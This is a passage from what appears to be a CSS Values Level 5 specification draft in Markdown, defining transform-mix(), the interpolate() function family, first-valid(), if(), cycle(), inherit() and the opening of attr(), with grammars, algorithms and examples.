The [computed value](css-cascade-5.md#computed-value) of a valid [calc-mix()](#funcdef-calc-mix) is its [used value](css-cascade-5.md#used-value) if all of the [<calc-sum>](css-values-4.md#typedef-calc-sum) and [<percentage>](css-values-4.md#percentage-value) values in it can be resolved, and is a calc-mix() notation with each of its <calc-sum> and <percentage> values computed individually otherwise.

### <a id="transform-mix"></a>6.4. Weighted Average of Transform Values: the [transform-mix()](#funcdef-transform-mix) notation

The *<a id="funcdef-transform-mix"></a>transform-mix()* [mix notation](#mix-notations) represents a weighted average of [<transform-list>](css-transforms-1.md#typedef-transform-list), with the following syntactic form:

```
<transform-mix()> = transform-mix( [ <transform-list> && <percentage [0,100]> ]# )
```

The [used value](css-cascade-5.md#used-value) of a valid [transform-mix()](#funcdef-transform-mix) is the result of producing a weighted average of its [<transform-list>](css-transforms-1.md#typedef-transform-list) values, with the weight of each item given by its corresponding [<percentage>](css-values-4.md#percentage-value) after [normalizing these mix percentages](#normalize-mix-percentages). Any “leftover” mix percentage is applied to an [identity transform](css-transforms-1.md#identity-transform-function) appended to the list. The weighting can be calculated by interpolating each <transform-list> using its <percentage> weight as the interpolation progress from the identity transform towards the <transform-list>. See [CSS Transforms 1 § 9 Interpolation of Transforms](css-transforms-1.md#interpolation-of-transforms).

If every [<percentage>](css-values-4.md#percentage-value) weight can be fully resolved, and the [<transform-list>](css-transforms-1.md#typedef-transform-list)s can be interpolated without used-value-time information, then the [computed value](css-cascade-5.md#computed-value) is the [used value](css-cascade-5.md#used-value); it is otherwise the [transform-mix()](#funcdef-transform-mix) notation itself with its arguments each computed according to their type.

[transform-mix()](#funcdef-transform-mix) is, itself, a [<transform-function>](css-transforms-2.md#typedef-transform-function).

## <a id="interpolation-notation"></a>7. Interpolation Mapping Notations: the *-interpolate() family

Several *<a id="interpolation-notations"></a>interpolation notations* in CSS allow representing an interpolated value corresponding to a certain amount of *<a id="interpolation-progress"></a>interpolation progress* along a defined scale or mapping function (the *<a id="interpolation-map"></a>interpolation map*). The [functional notations](css-values-4.md#functional-notation) follow the syntactic pattern:

```
*interpolate() = *interpolate( [ progress && global-options? ],
                               stop, [  between-options? , stop ]# )
```

Where:

-
*progress* specifies the input position into the [interpolation map](#interpolation-map); see [§ 7.1.1 Specifying the Interpolation Progress](#interpolation-progress-arguments)
-
*global-options* specifies additional options for the interpolation as a whole, and defaults for the between-stop interpolation options.
-
*stop* represents an [interpolation stop](#interpolation-stop); see [§ 7.1.2 Defining the Interpolation Map](#interpolation-map-arguments)
-
*between-options* specifies options for the interpolation between the two surrounding stops.

<a id="example-28bcfd83"></a> For example, the following changes the background color of an element depending on the width of the viewport:

```
background: color-interpolate(100vw in lch,
  200px: palegoldenrod,
  800px: palegreen,
  2000px: powderblue
);
```

-
Below 200px, the color is [palegoldenrod](css-color-4.md#valdef-color-palegoldenrod);
-
From 200px to 800px, the color interpolates in [lch](css-color-4.md#valdef-lch-lch) from [palegoldenrod](css-color-4.md#valdef-color-palegoldenrod) to [palegreen](css-color-4.md#valdef-color-palegreen);
-
From 800px to 2000px, the color interpolate in [lch](css-color-4.md#valdef-lch-lch) from [palegreen](css-color-4.md#valdef-color-palegreen) to [powderblue](css-color-4.md#valdef-color-powderblue);
-
Above 2000px, the color is [powderblue](css-color-4.md#valdef-color-powderblue).

<a id="example-0e16b33e"></a> In the following example, the font size interpolates from a smaller size on small screens to a larger size on large screens, easing along the interpolation curve. The author is storing the progress scale in a custom property to be able to re-use it across multiple font-size declarations throughout the document.

```
html {
  --font-scale: progress(100vw, 200px, 2000px) ease-in-out;
  font-size: calc-interpolate(var(--font-scale),
    0%: 16px,
    70%: 20px,
    100%: 24px);
}
h1 {
  font-size: calc-interpolate(var(--font-scale),
    0%: 1.2rem,
    40%: 2rem,
    100%: 3rem);
}
```

<a id="issue-afd5b308"></a> If anyone has better examples to punch in here let us know...

The [interpolation notations](#interpolation-notations) in CSS include:

-
[calc-interpolate()](#funcdef-calc-interpolate), for interpolating [<number>](css-values-4.md#number-value), [<length>](css-values-4.md#length-value), [<percentage>](css-values-4.md#percentage-value), [<time>](css-values-4.md#time-value), and other dimensions representable in [calc()](css-values-4.md#funcdef-calc) expressions
-
[transform-interpolate()](#funcdef-transform-interpolate), for interpolating [<transform-list>](css-transforms-1.md#typedef-transform-list)s
-
[color-interpolate()](#funcdef-color-interpolate), for interpolating <color> values

and finally the generic [interpolate()](#funcdef-interpolate) notation, which can represent the interpolation of any property’s values (but only the property’s entire value, not individual components).

<a id="issue-5ca864c6"></a> The [interpolate()](#funcdef-interpolate) notation also has a variant that takes a set of keyframes. It does this by referring to an @keyframes rule, and pulling the corresponding property declaration out of that. It would be nice to allow the other mix notations to take keyframe also, but how would we represent a set of keyframes for a [component value](css-syntax-3.md#component-value) (rather than a full property value)?

<a id="issue-e25667f7"></a> Do we have enough use-cases to motivate adding palette-interpolate()? palette-mix() already handles transitions.

### <a id="interpolation-syntax"></a>7.1. Global Syntax of the *-interpolate() family

The generic syntax of the [interpolation notations](#interpolation-notations) is as follows:

```
interpolate-function() = interpolate-function(
  [
    <progress-source> && [ by <easing-function> ]?
    && <easing-function>? && <segment-options>?
  ] ,
  <input-position>{1,2} : <output-value> ,
  [
    [ <easing-function> || <segment-options> ]? ,
    <input-position>{1,2} : <output-value>
  ]#?
)
```

These represent the [interpolation progress](#interpolation-progress) and [interpolation map](#interpolation-map) as described below.

#### <a id="interpolation-progress-arguments"></a>7.1.1. Specifying the Interpolation Progress

The *<a id="typedef-progress-source"></a>[<progress-source>](#typedef-progress-source)* value type represents the [interpolation progress](#interpolation-progress) in an [interpolation notation](#interpolation-notations). Its syntax is:

```
<progress-source> = <percentage> | <number> | <dimension> | <'animation-timeline'>
```

where:

***<a id="valdef-progress-source-percentage"></a>[<percentage>](css-values-4.md#percentage-value)* **
: Represents the [interpolation progress](#interpolation-progress) as a percentage, with 0% computing to zero and 100% computing to 1.
***<a id="valdef-progress-source-number"></a>[<number>](css-values-4.md#number-value)* **
: Represents the [interpolation progress](#interpolation-progress) as a number directly.

Note: This allows the use of the [progress()](#funcdef-progress) notations and other [math functions](css-values-4.md#math-function) that output a [<number>](css-values-4.md#number-value).

***<a id="valdef-progress-source-dimension"></a>[<dimension>](css-values-4.md#typedef-dimension)* **
: Represents the [interpolation progress](#interpolation-progress) as a dimension, which is converted to a number as specified in [§ 7.2 Validation and Normalization](#interpolation-normalization).

Note: Using a [<dimension>](css-values-4.md#typedef-dimension) value as [<progress-source>](#typedef-progress-source) requires at least some of the stops in the [interpolation map](#interpolation-map) to also use <dimension> positions of the same type. See [§ 7.2 Validation and Normalization](#interpolation-normalization).

***<a id="valdef-progress-source-animation-timeline"></a><'animation-timeline'>* **
: Represents the [interpolation progress](#interpolation-progress) as the progress of the specified animation timeline. The values none and auto are invalid. [[CSS-ANIMATIONS-2]](#biblio-css-animations-2) [[WEB-ANIMATIONS-2]](#biblio-web-animations-2)

If the specified timeline does not exist on the element or otherwise doesn’t have a progress for some reason, this represents an [interpolation progress](#interpolation-progress) of 0.

Note: Progress values below 0/0% and above 1/100% are unconventional, and potentially awkward, but valid. For example, most easing functions, though they will accept any input, are defined in consideration of progress defined between the [0,1] (i.e. [0%,100%]) range.

##### <a id="interpolation-progress-easing"></a>7.1.1.1. Easing Interpolation Progress: the by <easing-function> argument

The [interpolation progress](#interpolation-progress) given by [<progress-source>](#typedef-progress-source) may be optionally modified by the <easing-function> specified after the *<a id="valdef-calc-interpolate-by"></a>by* keyword. It applies the specified easing function to the “timeline” of progress as a whole by modifying the interpolation progress before it’s applied to the [interpolation map](#interpolation-map), analogous to animation-timing-function.

If omitted, defaults to linear

#### <a id="interpolation-map-arguments"></a>7.1.2. Defining the Interpolation Map

Similar to the gradient functions, the [interpolation notations](#interpolation-notations) define an [interpolation map](#interpolation-map) using a stop list, associating *<a id="input-positions"></a>input positions* with *<a id="output-values"></a>output values*. Each *<a id="interpolation-stop"></a>interpolation stop* represents, essentially, a keyframe of the interpolation map: values between [interpolation stops](#interpolation-stop) are interpolated between these adjacent keyframes in accordance with the [<segment-options>](#typedef-calc-interpolate-segment-options) and <easing-function> arguments applying between those keyframes.

The [interpolation map](#interpolation-map) values are defined as follows:

***<a id="typedef-calc-interpolate-input-position"></a>[<input-position>](#typedef-calc-interpolate-input-position){1,2} : <output-value>* **
: Represents an [interpolation stop](#interpolation-stop) associating the specified [input position](#input-positions)(s) with the specified [output values](#output-values). As with the gradient functions, if two [<input-position>](#typedef-calc-interpolate-input-position)s are specified, it is treated the same as two stops with the same <output-value>.

```
<input-position> = <percentage> | <number> | <dimension>
```

Note: [<output-value>](#typedef-calc-interpolate-input-position) is not given a grammar here, as the specific functions specify what their outputs are. <input-position>, however, is linked to [<progress-source>](#typedef-progress-source), see [§ 7.2.1 Type Checking](#interpolation-validity).

***<a id="valdef-calc-interpolate-easing-function"></a><easing-function>* **
: When appearing in the first argument, specifies the “default” easing function to be used between each stop. When appearing between stops, specifies the easing function to be used between the two surrounding stops, overriding any default provided by a global <easing-function> argument. (It is analogous to animation-timing-function.) If omitted, defaults to linear.

The input progress value to this easing function is the *<a id="segment-interpolation-progress"></a>segment interpolation progress*—​how far the [interpolation progress](#interpolation-progress) is between the [input positions](#input-positions) of the nearest stops preceding and following it.

<a id="example-b56d90e8"></a> For example, in color-interpolate(20%, 0%: red, ease-in-out, 80%: green, 100%: blue), the 20% [interpolation progress](#interpolation-progress) becomes a 25% [segment interpolation progress](#segment-interpolation-progress), as 20% is 25% of the way between 0% and 80%, the surrounding [input positions](#input-positions).

***<a id="typedef-calc-interpolate-segment-options"></a>[<segment-options>](#typedef-calc-interpolate-segment-options)* **
: When appearing in the first argument, provides any type-specific interpolation options that apply to every segment in the [interpolation map](#interpolation-map). (For example, [color-interpolate()](#funcdef-color-interpolate) allows <color-interpolation-method>.) When appearing between stops, provides any type-specific interpolation options that apply to the interpolation segment between the stops on either side of this argument, overriding any default provided by a corresponding global [<segment-options>](#typedef-calc-interpolate-segment-options) argument.
All positions before the first [interpolation stop](#interpolation-stop) map to the first stop’s [<output-value>](#typedef-calc-interpolate-input-position), and all positions after the last interpolation stop map to the last stop’s <output-value>. In other words, the map fills outward from the first/last stop (just like gradients)—​it does not interpolate beyond them.

### <a id="interpolation-normalization"></a>7.2. Validation and Normalization

#### <a id="interpolation-validity"></a>7.2.1. Type Checking

Each [<progress-source>](#typedef-progress-source) and [<input-position>](#typedef-calc-interpolate-input-position) has a *<a id="interpolation-input-type"></a>type*, which can be *<a id="interpolation-input-type-proportional"></a>proportional* ([<number>](css-values-4.md#number-value), [<percentage>](css-values-4.md#percentage-value), or <'animation-timeline'>) or *<a id="interpolation-input-type-absolute"></a>absolute* (all other types, and <'animation-timeline'>). The proportional types represent progress as a percentage; any mix of these types is valid. The [absolute](#interpolation-input-type-absolute) types represent progress in absolute dimensions, and all <progress-source> and <input-position> values that are not [proportional](#interpolation-input-type-proportional) must have a [consistent type](css-values-4.md#css-consistent-type) for the notation to be valid. Additionally, an [interpolation notation](#interpolation-notations) whose <progress-source> is not proportional must have at least one absolute <input-position> (in order to define the [interpolation range](#interpolation-range)), or else the notation is invalid.

Note: An <'animation-timeline'> has both a [proportional](#interpolation-input-type-proportional) type (the percentage progress) as well as an [absolute](#interpolation-input-type-absolute) type ([<time>](css-values-4.md#time-value) or [<length>](css-values-4.md#length-value)).

#### <a id="interpolation-range-calculation"></a>7.2.2. Calculating the Absolute Interpolation Range

The *<a id="interpolation-range"></a>interpolation range* specifies the [<dimension>](css-values-4.md#typedef-dimension) values corresponding to 0% and 100% [interpolation progress](#interpolation-progress), and thereby defines the mapping between [proportional](#interpolation-input-type-proportional) and [absolute](#interpolation-input-type-absolute) values.

In an [absolutely](#interpolation-input-type-absolute) typed [interpolation map](#interpolation-map), the first and last absolute stops in the list are assigned to 0% and 100%, respectively. (If there is only one absolutely typed [interpolation stop](#interpolation-stop), it is assigned to both 0% and 100%.)

A [proportionally](#interpolation-input-type-proportional) typed [interpolation map](#interpolation-map) does not define an [interpolation range](#interpolation-range).

#### <a id="interpolation-dimension-normaolization"></a>7.2.3. Normalizing Absolute Positions and Progress

If a [<progress-source>](#typedef-progress-source) or [<input-position>](#typedef-calc-interpolate-input-position) is specified as a [<dimension>](css-values-4.md#typedef-dimension), it is normalized to a number by linearly interpolating it between the start and end of the [interpolation range](#interpolation-range). (This can produce values less than 0 or greater than 1.)

<a id="example-5aa7b8a8"></a> For example, given a function like:

```
background-color: color-interpolate(300px in hsl, 200px: red, 500px: green, 600px: blue);
```

The [interpolation range](#interpolation-range) is (200px, 600px), so the [<progress-source>](#typedef-progress-source) is converted to the number 0.25, and the three stops are converted to the numbers 0, .75, and 1.

Thus, that function is equivalent to:

```
background-color: color-interpolate(25% in hsl, 0%: red, 75%: green, 100%: blue);
```

In either case, the result will be a color 1/3 of the way between [red](css-color-4.md#valdef-color-red) and [green](css-color-4.md#valdef-color-green) using HSL interpolation, giving hsl(40deg, 100%, 50%), a light orange.

#### <a id="interpolation-stop-fixup"></a>7.2.4. Interpolation Stop Fixup

Once all [interpolation stops](#interpolation-stop) have been normalized, they are additionally fixed up so that they progress in order from the first stop to the last. If any stop has an [input position](#input-positions) that is less than the input position of the preceding stop, it is set to the input position of the previous stop.

### <a id="interpolation-resolution"></a>7.3. Interpolation Resolution

The [used value](css-cascade-5.md#used-value) of a valid [interpolation notation](#interpolation-notations) is the result of mapping its [interpolation progress](#interpolation-progress) through the specified [interpolation map](#interpolation-map).

The [computed value](css-cascade-5.md#computed-value) is the [used value](css-cascade-5.md#used-value) if it is possible to calculate. Otherwise, if its [interpolation progress](#interpolation-progress), [input positions](#input-positions), and interpolation options can all be resolved, then it is simplified to a two-stop [interpolation notation](#interpolation-notations) with [<number>](css-values-4.md#number-value) values for the interpolation progress and input positions, and all other values computed according to their type. Otherwise, it is the interpolation notation itself, with its arguments computed individually otherwise.

### <a id="calc-interpolate"></a>7.4. Interpolated Numeric and Dimensional Values: the [calc-interpolate()](#funcdef-calc-interpolate) notation

The *<a id="funcdef-calc-interpolate"></a>calc-interpolate()* [interpolation notation](#interpolation-notations) represents an interpolated numeric or dimensional value. Like [calc()](css-values-4.md#funcdef-calc), it is a [math function](css-values-4.md#math-function), with the following syntax:

```
<calc-interpolate()> = calc-interpolate(
  [
    <progress-source> && [ by <easing-function> ]?
    && <easing-function>?
  ] ,
  <input-position>{1,2} : <calc-sum> ,
  [ <easing-function>? , <input-position>{1,2} : <calc-sum> ]#? )
```

The [<calc-sum>](css-values-4.md#typedef-calc-sum) arguments can resolve to any [<number>](css-values-4.md#number-value), [<dimension>](css-values-4.md#typedef-dimension), or [<percentage>](css-values-4.md#percentage-value), but must have a [consistent type](css-values-4.md#css-consistent-type) or else the function is invalid. The result’s type will be that consistent type.

The [<progress-source>](#typedef-progress-source) and [<input-position>](#typedef-calc-interpolate-input-position) values do not use the inherited [calculation context](css-values-4.md#calculation-contexts); they resolve percentages as specified in [§ 7.2 Validation and Normalization](#interpolation-normalization).

### <a id="color-interpolate"></a>7.5. Interpolated Color Values: the [color-interpolate()](#funcdef-color-interpolate) notation

The *<a id="funcdef-color-interpolate"></a>color-interpolate()* [interpolation notation](#interpolation-notations) represents an interpolated <color> value, with the following syntax:

```
<color-interpolate()> = color-interpolate(
  [
    <progress-source> && [ by <easing-function> ]?
    && <easing-function>? && <color-interpolation-method>?
  ] ,
  <input-position>{1,2} : <color>,
  [
    [ <easing-function> || <color-interpolation-method> ]?,
    <input-position>{1,2} : <color>
  ]#? )
```

### <a id="transform-interpolate"></a>7.6. Interpolated Transform Values: the [transform-interpolate()](#funcdef-transform-interpolate) notation

The *<a id="funcdef-transform-interpolate"></a>transform-interpolate()* [interpolation notation](#interpolation-notations) represents an interpolated [<transform-list>](css-transforms-1.md#typedef-transform-list), with the following syntax:

```
<transform-interpolate()> = transform-interpolate(
  [
    <progress-source> && [ by <easing-function> ]?
    && <easing-function>?
  ],
  <input-position>{1,2} : <transform-list>,
  [ <easing-function>?, <input-position>{1,2} : <transform-list> ]#? )
```

[transform-interpolate()](#funcdef-transform-interpolate) is, itself, a [<transform-function>](css-transforms-2.md#typedef-transform-function).

### <a id="mix"></a>7.7. Interpolated Property Values: the [interpolate()](#funcdef-interpolate) notation

The *<a id="funcdef-interpolate"></a>interpolate()* [interpolation notation](#interpolation-notations) represents the interpolation of entire property values, which supports two alternative syntax patterns:

```
<interpolate()> = interpolate(
  [
    <progress-source> && [ by <easing-function> ]?
    && <easing-function>?
  ] ,
  <input-position>{1,2} : <whole-value>,
  [ <easing-function>?, <input-position>{1,2} : <whole-value> ]#? )
|
  interpolate( <progress-source> && [ by <easing-function> ]?
    && <easing-function>? of <keyframes-name> )
```

The first syntax alternative, like other [interpolation notations](#interpolation-notations), assembles an [interpolation map](#interpolation-map) from a list of [interpolation stops](#interpolation-stop). The second uses the corresponding property declarations from a set of keyframes, incorporating those values into the normal cascade for this property.

Each [<whole-value>](#whole-value) argument is computed as if it were the value of this property; and all other arguments computed according to their type.

<a id="example-f5c03c8b"></a> For example, most uses of [interpolate()](#funcdef-interpolate) will resolve at computed-value time:

```
color: interpolate(90%, 0: red, 1: blue);
/* via simple interpolation,
   computes to: */
color: rgb(10% 0 90%);

color: interpolate(90%, 0: currentcolor, 1: black);
/* can't be fully resolved at computed-value time,
   but still has a defined representation: */
color: color-mix(currentcolor 90%, black 10%);

float: interpolate(90%, 0: left, 1: right);
/* discretely animatable */
float: right;
```

The [interpolate()](#funcdef-interpolate) notation is a [<whole-value>](#whole-value). Additionally, if any of its <whole-value> arguments are not animatable, the notation is invalid.

<a id="example-bdc7682c"></a> For example, the following declarations are invalid, and will be ignored:

```
/* Invalid start value */
color: interpolate(90%, 0: #invalid, 1: #F00);

/* Function is mixed with other values */
background: url(ocean) interpolate(10%, 0: blue, 1: yellow);

/* 'animation-*' is not animatable */
animation-delay: interpolate(0%, 0: 0s, 1: 2s);
```

## <a id="value-insert"></a>8. Miscellaneous Value Substituting Functions

### <a id="whole-value"></a>8.1. Representing An Entire Property Value: the [<whole-value>](#whole-value) type

Several functions defined in this specification can only be used as the "whole value" of a property. For example, [background-position: cycle(50px 50px, center);](css-backgrounds-3.md#propdef-background-position) is valid, but background-position: cycle(50px, center) 50px; is not. The [<whole-value>](#whole-value) production represents these values.

All properties implicitly accept a [<whole-value>](#whole-value) as their entire value, just as they accept the [CSS-wide keywords](css-values-4.md#css-wide-keywords) as their entire value.

When used as a component value of a function, [<whole-value>](#whole-value) also represents any CSS value normally valid as the whole value of the property in which it is used (including additional <whole-value> functions). However, some functions may restrict what a <whole-value> argument can include.

### <a id="first-valid"></a>8.2. Selecting the First Supported Value: the [first-valid()](#funcdef-first-valid) notation

CSS supports progressive enhancement with its forward-compatible parsing: authors can declare the same property multiple times in a style rule, using different values each time, and a CSS UA will automatically use the last one that it understands and throw out the rest. This principle, together with the @supports rule, allows authors to write stylesheets that work well in old and new UAs simultaneously.

However, using var() (or similar substitution functions that resolve after parsing) thwarts this functionality; CSS UAs must assume any such property is valid at parse-time.

The *<a id="funcdef-first-valid"></a>first-valid()* [functional notation](css-values-4.md#functional-notation) inlines the fallback behavior intrinsic to parsing declarations. Unlike most notations, it can accept any valid or invalid syntax in its arguments, and represents the first value among its arguments that is supported (parsed as valid) by the UA as the whole value of the property it’s used in.

```
<first-valid()> = first-valid( <declaration-value># )
```

If none of the arguments represent a valid value for the property, the property is [invalid at computed-value time](#invalid-at-computed-value-time).

[first-valid()](#funcdef-first-valid) is a [<whole-value>](#whole-value).

<a id="issue-3679a886"></a> Should this have a different name? We didn’t quite decide on it during the resolution to add this.

Note: Despite effectively taking [<whole-value>](#whole-value)s as its argument, [first-valid()](#funcdef-first-valid) is instead defined to take [<declaration-value>](css-syntax-3.md#typedef-declaration-value)s because, by definition, it’s intended to be used in cases *where its values might be invalid for the declaration it’s in*. <declaration-value> imposes no contextual validity constraints on what it matches, unlike <whole-value>.

### <a id="if-notation"></a>8.3. Conditional Value Selection: the [if()](#funcdef-if) notation

The *<a id="funcdef-if"></a>if()* function is an [arbitrary substitution function](#arbitrary-substitution-function) that represents conditional values. Its argument consists of an ordered semi-colon–separated list of statements, each consisting of a condition followed by a colon followed by a value. An [if()](#funcdef-if) function represents the value corresponding to the first condition in its argument list to be true; if no condition matches, then the if() function represents an empty token stream.

The [if()](#funcdef-if) function’s syntax is defined as follows:

```
<if()> = if( [ <if-branch> ; ]* <if-branch> ;? )
<a id="typedef-if-branch"></a><if-branch> = <if-condition> : <declaration-value>?
<a id="typedef-if-condition"></a><if-condition> = <boolean-expr[ <if-test> ]> | else
<a id="typedef-if-test"></a><if-test> =
  supports( [ <ident> : <declaration-value> ] | <supports-condition> ) |
  media( <media-feature> | <media-condition> ) |
  style( <style-query> )
```

The *<a id="valdef-if-else"></a>else* keyword represents a condition that is always true.

The [if()](#funcdef-if) function’s [argument grammar](#argument-grammar) is:

```
<a id="typedef-if-args"></a><if-args> = if( [ <if-args-branch> ; ]* <if-args-branch> ;? )
<a id="typedef-if-args-branch"></a><if-args-branch> = <declaration-value> : <declaration-value>?
```

In the above [<if-args-branch>](#typedef-if-args-branch) production, the first [<declaration-value>](css-syntax-3.md#typedef-declaration-value) excludes top-level [<colon-token>](css-syntax-3.md#typedef-colon-token)s as part of its [free-form production](#free-form-productions) restrictions (alongside commas and curly braces).

To *<a id="replace-an-if-function"></a>[replace an if() function](#replace-an-arbitrary-substitution-function)*, given a list of *arguments*:

1.
For each [<if-args-branch>](#typedef-if-args-branch) *branch* in *arguments*:
  1.
  [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in the first [<declaration-value>](css-syntax-3.md#typedef-declaration-value) of *branch*, then [parse](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) the result as an [<if-condition>](#typedef-if-condition). If parsing returns failure, continue; otherwise, let the result be *condition*.
  2.
  Evaluate *condition*.
  If a <style-query> in *condition* tests the value of a property, and [guarding](#guarded) a [substitution context](#substitution-context) «"property", referenced-property-name» would mark it as a [cyclic substitution context](#cyclic-substitution-contexts), that query evaluates to false.
  <a id="example-34dea991"></a> For example, in --foo: if(style(--foo: bar): baz); the style() query is automatically false, since [property replacement](#property-replacement) has already established a «"property", "--foo"» [substitution context](#substitution-context).
  If the result of *condition* is false, continue.
  3.
  [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in the second [<declaration-value>](css-syntax-3.md#typedef-declaration-value) of *branch*, and return the result.
2.
Return nothing (an empty sequence of [component values](css-syntax-3.md#component-value)).

Note: Unlike using @media/@supports/@container rules, which just ignore their contents when they’re false and let the cascade determine what values otherwise apply, declarations with [if()](#funcdef-if) do not roll back the cascade if the conditions are false; any fallback values must be provided inline. However, see the [revert-rule](css-cascade-5.md#valdef-all-revert-rule) [CSS-wide keyword](css-values-4.md#css-wide-keywords).

### <a id="cycle-notation"></a>8.4. <a id="toggle-notation"></a> Toggling Between Values: the [cycle()](#funcdef-cycle) notation

The *<a id="funcdef-cycle"></a>cycle()* expression allows descendant elements to cycle over a list of values instead of inheriting the same value.

<a id="example-5f10b9f5"></a> The following example makes `<em>` elements italic in general, but makes them normal if they’re inside something that’s italic:

```
em { font-style: cycle(italic, normal); }
```

<a id="example-ae61c068"></a> The following example cycles markers for nested lists, so that a top level list has disc-shaped markers, but nested lists use circle, then square, then box, and then repeat through the list of marker shapes, starting again (for the 5th list deep) with disc.

```
ul { list-style-type: cycle(disc, circle, square, box); }
```

The syntax of the [cycle()](#funcdef-cycle) expression is:

```
<cycle()> = cycle( <whole-value># )
```

The [cycle()](#funcdef-cycle) notation is a [<whole-value>](#whole-value). However, it is not allowed to be nested, nor may it contain [attr()](#funcdef-attr) or [calc()](css-values-4.md#funcdef-calc) notations; declarations containing such constructs are invalid.

<a id="example-d0b77940"></a> The following [cycle()](#funcdef-cycle) examples are all invalid:

```
background-position: 10px cycle(50px, 100px);
/* cycle() must be the sole value of the property */

list-style-type: cycle(disc, 50px);
/* ''50px'' isn't a valid value of 'list-style-type' */
```

To determine the computed value of [cycle()](#funcdef-cycle), first evaluate each argument as if it were the sole value of the property in which cycle() is placed to determine the computed value that each represents, called *C_n* for the *n*-th argument to cycle(). Then, compare the property’s [inherited value](css-cascade-5.md#inherited-value) with each *C_n*. For the earliest *C_n* that matches the inherited value, the computed value of cycle() is *C_n+1*. If the match was the last argument in the list, or there was no match, the computed value of cycle() is the computed value that the first argument represents.

Note: This means that repeating values in a [cycle()](#funcdef-cycle) short-circuits the list. For example cycle(1em, 2em, 1em, 4em) will be equivalent to cycle(1em, 2em).

Note: That [cycle()](#funcdef-cycle) explicitly looks at the computed value of the parent, so it works even on non-inherited properties. This is similar to the [inherit](css-cascade-5.md#valdef-all-inherit) keyword, which works even on non-inherited properties.

Note: The [computed value](css-cascade-5.md#computed-value) of a property is an abstract set of values, not a particular serialization [[CSS21]](#biblio-css21), so comparison between computed values should always be unambiguous and have the expected result. For example, a Level 2 background-position computed value is just two offsets, each represented as an absolute length or a percentage, so the declarations [background-position: top center](css-backgrounds-3.md#propdef-background-position) and background-position: 50% 0% produce identical computed values. If the "Computed Value" line of a property definition seems to define something ambiguous or overly strict, please [provide feedback](#sotd) so we can fix it.

If [cycle()](#funcdef-cycle) is used on a [shorthand property](css-cascade-5.md#shorthand-property), it sets each of its longhands to a cycle() value with arguments corresponding to what the longhand would have received had each of the original cycle() arguments been the sole value of the shorthand.

<a id="example-628c19d5"></a> For example, the following shorthand declaration:

```
margin: cycle(1px 2px, 4px, 1px 5px 4px);
```

is equivalent to the following longhand declarations:

```
margin-top:    cycle(1px, 4px, 1px);
margin-right:  cycle(2px, 4px, 5px);
margin-bottom: cycle(1px, 4px, 4px);
margin-left:   cycle(2px, 4px, 5px);
```

Note that, since 1px appears twice in the top margin and 4px appears twice in bottom margin, they will cycle between only two values while the left and right margins cycle through three. In other words, the declarations above will yield the same computed values as the longhand declarations below:

```
margin-top:    cycle(1px, 4px);
margin-right:  cycle(2px, 4px, 5px);
margin-bottom: cycle(1px, 4px);
margin-left:   cycle(2px, 4px, 5px);
```

which may not be what was intended.

### <a id="var-notation"></a>8.5. Custom Property References: the var() notation

The var() notation substitutes the value of a custom property, see the [CSS Custom Properties for Cascading Variables Module](css-variables-1.md#using-variables). [[CSS-VARIABLES]](#biblio-css-variables)

### <a id="inherit-notation"></a>8.6. Inherited Value References: the [inherit()](#funcdef-inherit) notation

Like the [inherit](css-cascade-5.md#valdef-all-inherit) keyword, the *<a id="funcdef-inherit"></a>inherit()* [functional notation](css-values-4.md#functional-notation) resolves to the [computed value](css-cascade-5.md#computed-value) of a property on the parent. Rather than resolving to the value of the same property, however, it resolves to a sequence of [component values](css-syntax-3.md#component-value) representing the computed value of the property specified as its first argument. Its second argument, if present, is used as a fallback in case the first argument resolves to the guaranteed-invalid value.

[inherit()](#funcdef-inherit) is an [arbitrary substitution function](#arbitrary-substitution-function) whose syntax is defined as:

```
<inherit()> = inherit( <custom-property-name>, <declaration-value>? )
```

The [inherit()](#funcdef-inherit) function’s [argument grammar](#argument-grammar) is:

```
<a id="typedef-inherit-args"></a><inherit-args> = inherit( <declaration-value>, <declaration-value>? )
```

Like var(), a bare comma can be used with nothing following it, indicating that the second [<declaration-value>](css-syntax-3.md#typedef-declaration-value) was passed, just as an empty sequence.

Note: That is, inherit(--foo) does not pass a fallback value, but inherit(--foo,) does (the fallback is just empty).

To *<a id="replace-an-inherit-function"></a>[replace an inherit() function](#replace-an-arbitrary-substitution-function)*, given a list of *arguments*:

1.
[Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in the first [<declaration-value>](css-syntax-3.md#typedef-declaration-value) of *arguments*, then [parse](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) it as a <custom-property-name>.
2.
If parsing returned a <custom-property-name>, and the [inherited value](css-cascade-5.md#inherited-value) of that custom property on the element does not contain the guaranteed-invalid value, return that inherited value.
3.
Otherwise, if a second [<declaration-value>](css-syntax-3.md#typedef-declaration-value)? was passed in *arguments*, [substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in that argument, and return the result.
4.
Otherwise, return the guaranteed-invalid value.

Note: Future levels of CSS may allow specifying standard CSS properties in [inherit()](#funcdef-inherit); however because the tokenization of [computed values](css-cascade-5.md#computed-value) is not fully standardized for all CSS properties, this feature is deferred from Level 5. Note that the computed value differs from the [used value](css-cascade-5.md#used-value), and is not always the resolved value returned by `getComputedStyle()`; thus even if inherit(width) were allowed, it would frequently return the keyword auto, not the used [<length>](css-values-4.md#length-value).

### <a id="attr-notation"></a>8.7. Attribute References: the [attr()](#funcdef-attr) notation

The *<a id="funcdef-attr"></a>attr()* function substitutes the value of an attribute on an element into a property, similar to how the var() function substitutes a custom property value into a function.

```
attr() = attr( <attr-name> <attr-type>? , <declaration-value>?)

<a id="typedef-attr-name"></a><attr-name> = [ <ident-token>? '|' ]? <ident-token>
<a id="typedef-attr-type"></a><attr-type> = <a id="funcdef-attr-type"></a>type( <syntax> ) | raw-string | number | <attr-unit>
<a id="typedef-attr-unit"></a><attr-unit> = <custom-ident>
```

The [attr()](#funcdef-attr) function’s [argument grammar](#argument-grammar) is:

```
<a id="typedef-attr-args"></a><attr-args> = attr( <declaration-value>, <declaration-value>? )
```

Like var(), a bare comma can be used with nothing following it, indicating that the second [<declaration-value>](css-syntax-3.md#typedef-declaration-value) was passed, just as an empty sequence.

Note: That is, attr(foo) does not pass a fallback value, but attr(foo,) does (the fallback is just empty).

